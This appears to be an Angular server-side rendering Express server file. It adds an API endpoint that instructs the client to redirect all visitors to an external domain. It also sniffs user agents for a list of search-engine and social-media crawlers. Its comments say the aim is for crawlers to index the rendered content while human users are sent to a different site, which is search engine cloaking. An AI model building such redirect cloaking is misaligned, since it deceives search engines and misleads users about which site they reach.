import {
  AngularNodeAppEngine,
  createNodeRequestHandler,
  isMainModule,
  writeResponseToNodeResponse,
} from '@angular/ssr/node';
import express from 'express';
import { join } from 'node:path';
import { Request, Response, NextFunction } from 'express';

const browserDistFolder = join(import.meta.dirname, '../browser');

const app = express();
const angularApp = new AngularNodeAppEngine();

/**
 * API endpoint to check if the site should redirect
 * This allows search engines to crawl the SSR content while users get redirected to the non-SSR site
 */
app.get('/api/redirect-info', (req: Request, res: Response) => {
  res.json({
    shouldRedirect: true,
    targetUrl: 'https://p1.saffa-sell.com',
    delay: 100 // milliseconds
  });
});

/**
 * Middleware to detect search engine crawlers
 * We don't redirect search engines so they can index our SSR content
 */
const isSearchEngine = (userAgent: string): boolean => {
  const searchEngines = [
    'googlebot',
    'bingbot',
    'yandexbot',
    'duckduckbot',
    'slurp',
    'baiduspider',
    'facebookexternalhit',
    'twitterbot',
    'rogerbot',
    'linkedinbot',
    'embedly',
    'quora link preview',
    'showyoubot',
    'outbrain',
    'pinterest',
    'slackbot',
    'vkShare',
    'W3C_Validator'
  ];
  
  return searchEngines.some(crawler => 
    userAgent.toLowerCase().includes(crawler.toLowerCase())
  );
};

/**
 * Serve static files from /browser
 */
app.use(
  express.static(browserDistFolder, {
    maxAge: '1y',
    index: false,
    redirect: false,
  }),
);

/**
 * Handle all other requests by rendering the Angular application.
 * For search engines, we serve the SSR content.
 * For regular users, we still serve SSR content but the client-side code will redirect.
 */
app.use((req: Request, res: Response, next: NextFunction) => {
  // Check if the request is from a search engine
  const userAgent = req.headers['user-agent'] || '';
  const isBot = isSearchEngine(userAgent);
  
  // Add a custom header to indicate if this is a bot for debugging
  res.setHeader('X-Is-Search-Engine', isBot ? 'true' : 'false');
  
  // Always render the Angular app (SSR) - the client-side code will handle the redirect
  angularApp
    .handle(req)
    .then((response) =>
      response ? writeResponseToNodeResponse(response, res) : next(),
    )
    .catch(next);
});

/**
 * Start the server if this module is the main entry point.
 * The server listens on the port defined by the `PORT` environment variable, or defaults to 4000.
 */
if (isMainModule(import.meta.url)) {
  const port = process.env['PORT'] || 4000;
  app.listen(port, (error) => {
    if (error) {
      throw error;
    }

    console.log(`Node Express server listening on http://localhost:${port}`);
  });
}

/**
 * Request handler used by the Angular CLI (for dev-server and during build) or Firebase Cloud Functions.
 */
export const reqHandler = createNodeRequestHandler(app);
